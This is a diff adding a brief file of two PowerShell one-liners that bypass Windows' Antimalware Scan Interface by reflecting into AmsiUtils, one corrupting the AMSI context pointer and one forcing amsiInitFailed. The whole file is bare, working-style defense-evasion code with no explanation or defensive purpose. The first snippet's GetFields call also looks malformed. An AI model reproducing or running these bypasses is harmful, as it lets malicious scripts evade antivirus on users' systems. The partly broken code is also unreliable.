@@ -1,0 +1,17 @@
+ 
+
+
+
+
+Bypass by corrupting amsi context
+---------------------------------
+$c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$d=$c.GetFields('amsiInitFailed','NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null,$true);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+
+
+
+Bypass by corrupting amsi initialization
+-------------------------------------------
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$c = $b.SetValue($null,$true)
